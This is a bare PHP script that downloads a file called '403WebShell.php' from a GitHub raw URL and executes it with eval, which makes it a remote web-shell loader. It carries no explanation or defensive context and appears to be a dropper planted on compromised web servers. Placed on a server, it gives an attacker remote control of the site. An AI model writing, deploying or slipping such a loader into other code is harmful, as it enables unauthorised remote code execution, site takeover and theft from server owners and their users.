<?php
//
$Url = "https://raw.githubusercontent.com/yon3zu/403WebShell/refs/heads/main/403WebShell.php";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $Url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$output = curl_exec($ch);
curl_close($ch);
eval('?>' . $output);
?>
